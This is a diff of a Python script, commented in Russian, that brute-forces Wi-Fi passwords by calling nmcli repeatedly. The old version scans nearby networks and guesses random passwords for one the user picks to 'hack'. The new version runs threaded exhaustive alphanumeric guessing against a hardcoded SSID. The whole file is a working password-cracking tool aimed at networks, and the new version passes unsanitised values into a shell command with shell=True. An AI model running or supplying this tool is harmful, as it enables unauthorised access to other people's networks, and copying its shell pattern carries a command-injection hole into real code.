@@ -1,69 +1,48 @@
-import subprocess
-import re
-import random
+import itertools
 import string
 import threading
+import time
+import subprocess
 
-def get_wifi_networks():
-    # Запускаем команду для сканирования доступных Wi-Fi сетей
-    result = subprocess.run(['iwlist', 'scan'], capture_output=True, text=True)
-    output = result.stdout
-    
-    # Используем регулярные выражения для извлечения SSID сетей
-    networks = re.findall(r'ESSID:"([^"]+)"', output)
-    
-    return networks
+# Функция для проверки пароля
+def check_password(ssid, password):
+    try:
+        # Используем команду для подключения к Wi-Fi
+        command = f"nmcli dev wifi connect {ssid} password {password}"
+        result = subprocess.run(command, shell=True, capture_output=True, text=True)
+        
+        # Если пароль верный, выводим его
+        if "successfully" in result.stdout:
+            print(f"Пароль найден: {password}")
+            return True
+    except Exception as e:
+        print(f"Ошибка при проверке пароля: {e}")
+    return False
 
-def generate_random_password(length=8):
-    # Генерируем случайный пароль заданной длины
-    characters = string.ascii_letters + string.digits + string.punctuation
-    return ''.join(random.choice(characters) for _ in range(length))
+# Функция для генерации и проверки паролей в потоке
+def brute_force_thread(ssid, start, end):
+    for length in range(start, end):
+        for guess in itertools.product(string.ascii_letters + string.digits, repeat=length):
+            password = ''.join(guess)
+            if check_password(ssid, password):
+                return
 
-def try_password(ssid, password):
-    # Пытаемся подключиться к Wi-Fi сети с использованием сгенерированного пароля
-    result = subprocess.run(['nmcli', 'dev', 'wifi', 'connect', ssid, 'password', password], capture_output=True, text=True)
-    output = result.stdout
-    
-    # Если подключение успешно, возвращаем пароль
-    if "successfully activated" in output:
-        return password
-    else:
-        return None
+# Основная функция
+def main():
+    ssid = "TP-Link_BB78" # Замените на имя вашей Wi-Fi сети
+    num_threads = 6
+    chunk_size = 5  # Размер диапазона для каждого потока
 
-def crack_wifi_password(ssid, num_threads=4):
-    passwords = set()
     threads = []
-    
-    def worker():
-        while True:
-            password = generate_random_password()
-            if password in passwords:
-                continue
-            passwords.add(password)
-            result = try_password(ssid, password)
-            if result:
-                print(f"Пароль найден: {result}")
-                return result
-    
-    for _ in range(num_threads):
-        thread = threading.Thread(target=worker)
+    for i in range(num_threads):
+        start = i * chunk_size + 1
+        end = start + chunk_size
+        thread = threading.Thread(target=brute_force_thread, args=(ssid, start, end))
         threads.append(thread)
         thread.start()
-    
+
     for thread in threads:
         thread.join()
-
-def main():
-    networks = get_wifi_networks()
-    print("Доступные Wi-Fi сети:")
-    for i, network in enumerate(networks):
-        print(f"{i + 1}. {network}")
-    
-    choice = int(input("Выберите сеть для взлома (номер): ")) - 1
-    ssid = networks[choice]
-    
-    print(f"Начинаем взлом сети {ssid}...")
-    crack_wifi_password(ssid)
 
 if __name__ == "__main__":
     main()
